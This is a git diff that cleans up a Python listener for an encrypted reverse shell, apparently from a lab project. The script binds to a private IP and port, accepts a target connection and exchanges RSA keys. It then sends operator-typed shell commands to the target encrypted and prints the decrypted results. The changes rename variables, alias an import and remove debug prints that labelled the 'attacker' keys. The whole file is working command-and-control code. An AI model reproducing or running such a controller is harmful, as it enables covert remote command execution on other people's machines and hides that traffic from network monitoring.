@@ -1,31 +1,27 @@
-# pylint: disable=bare-except, missing-docstring, import-error
+# pylint: disable=bare-except, missing-docstring, import-error, invalid-name
 import socket
-from cryptidy import asymmetric_encryption
+from cryptidy import asymmetric_encryption as ae
 
 HOST = '10.0.2.4' # Listen on all network interfaces
 PORT = 12345  # Choose a port number
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-binded = False
-while not binded:
+bound_to_port = False
+while not bound_to_port:
     try:
         s.bind((HOST, PORT))
-        binded = True
+        bound_to_port = True
     except OSError as e:
-        # ignore
-        pass
+        pass # ignore err and try again
 
 s.listen(1)
 print(f"Listening on {HOST}:{PORT}")
 conn, addr = s.accept()
 print(f"Connection from {addr}")
 
-priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
-print(f'attacker priv key: {priv_key}')
-print(f'attacker pub key: {pub_key}')
+priv_key, pub_key = ae.generate_keys(2048)  # 2048 bits RSA key
 conn.send(pub_key.encode())
 
 target_pub_key = conn.recv(1024).decode()
-print(f'target pub key: {target_pub_key}')
 
 while True:
     command = input("Enter command to execute or 'exit' to quit: ")
@@ -33,14 +29,12 @@ while True:
         conn.send('exit'.encode())
         conn.close()
         break
-    # conn.send(command.encode())
-    conn.send(asymmetric_encryption.encrypt_message(command, target_pub_key))
-    # output = conn.recv(1024).decode()
+    conn.send(ae.encrypt_message(command, target_pub_key))
     encrypted_output = conn.recv(1024)
 
     if len(encrypted_output) > 0:
         print(len(encrypted_output))
-        _, output = asymmetric_encryption.decrypt_message(encrypted_output, priv_key)
+        _, output = ae.decrypt_message(encrypted_output, priv_key)
         print(output, end="")
     else:
         print("<no output>\n")
